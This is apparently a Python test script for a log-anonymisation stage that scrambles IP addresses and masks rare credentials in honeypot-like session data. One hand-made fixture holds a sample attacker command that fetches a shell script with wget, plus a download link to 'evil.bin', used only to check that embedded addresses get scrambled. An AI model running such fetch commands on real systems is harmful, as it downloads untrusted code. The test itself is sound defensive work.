#!/usr/bin/env python3
"""Tests for the identity-hiding stage. Run: python3 test_anonymise.py"""
import json
import re
from collections import defaultdict

from anonymise import IPV4, Scrambler, anonymise

KEY = open("secret.key").read().strip().encode()
orig = [json.loads(l) for l in open("data/sessions.jsonl")]
anon = [json.loads(l) for l in open("data/sessions_anon.jsonl")]
labels = json.load(open("data/labels_anon.json"))
ok = True


def check(name, cond, detail=""):
    global ok
    ok &= bool(cond)
    print(("PASS  " if cond else "FAIL  ") + name + (f"   {detail}" if detail else ""))


# 1. No original address survives anywhere in the output.
orig_ips = {e["src_ip"] for e in orig}
blob = open("data/sessions_anon.jsonl").read() + open("data/labels_anon.json").read()
leaked = [ip for ip in orig_ips if ip in blob]
check("no original address appears in the output", not leaked, f"{len(orig_ips)} addresses checked")
check("no address-shaped text left at all", not IPV4.findall(blob))

# 2. Same address -> same code, different addresses -> different codes.
m = defaultdict(set)
for o, a in zip(orig, anon):
    m[o["src_ip"]].add(a["src_ip"])
check("each address always gets one code", all(len(v) == 1 for v in m.values()))
codes = [next(iter(v)) for v in m.values()]
check("different addresses never share a code", len(set(codes)) == len(codes))

# 3. Nothing lost or reordered; temporary port gone.
check("same number of events", len(orig) == len(anon))
check("same order and event types", [e["eventid"] for e in orig] == [e["eventid"] for e in anon])
check("temporary port removed", not any("src_port" in e for e in anon))

# 4. Evidence the checker will need is still in the anonymised footage.
by_s = defaultdict(str)
for e in anon:
    by_s[e["session"]] += json.dumps(e)
missing = [x for l in labels for x in l["evidence"]["urls"] + l["evidence"]["hashes"]
           if x not in by_s[l["session"]]]
check("every labelled web link and fingerprint still present", not missing)

# 5. Patterns survive: a visitor who guessed many passwords is still one visitor.
fails = defaultdict(int)
for e in anon:
    if e["eventid"] == "login.failed":
        fails[e["src_ip"]] += 1
check("per-visitor behaviour still visible", max(fails.values()) > 50,
      f"most failed logins from one code: {max(fails.values())}")

# 6. Hand-made cases for rules the made-up data does not exercise.
scr = Scrambler(KEY)
evs = [
    {"session": "s1", "src_ip": "203.0.113.9", "eventid": "command.input",
     "input": "wget http://203.0.113.77/x.sh; ping 198.51.100.1"},
    {"session": "s1", "src_ip": "203.0.113.9", "eventid": "file.download",
     "url": "http://198.51.100.1/evil.bin"},
]
for i in range(6):  # 'admin'/'123456' used in 6 visits = common; 'jsmith'/'Tr0ub4dor' once = rare
    evs.append({"session": f"c{i}", "src_ip": "192.0.2.1", "eventid": "login.failed",
                "username": "admin", "password": "123456"})
evs.append({"session": "r1", "src_ip": "192.0.2.1", "eventid": "login.failed",
            "username": "jsmith", "password": "Tr0ub4dor"})
out, stats = anonymise(evs, scr)
check("addresses inside commands are scrambled", not IPV4.search(out[0]["input"]))
check("addresses inside links are scrambled", not IPV4.search(out[1]["url"]))
check("same address inside text and header gets same code",
      scr.ip("198.51.100.1") in out[0]["input"] and scr.ip("198.51.100.1") in out[1]["url"])
check("common credential kept", out[2]["username"] == "admin" and out[2]["password"] == "123456")
check("rare credential masked", out[-1]["username"].startswith("masked-")
      and out[-1]["password"].startswith("masked-") and "Tr0ub4dor" not in json.dumps(out[-1]))

# 7. Different secret key -> different codes (so codes cannot be recomputed without the key).
other = Scrambler(b"a-different-key")
check("codes depend on the secret key", other.ip("192.0.2.44") != scr.ip("192.0.2.44"))

print("\nALL TESTS PASSED" if ok else "\nSOME TESTS FAILED")
raise SystemExit(0 if ok else 1)
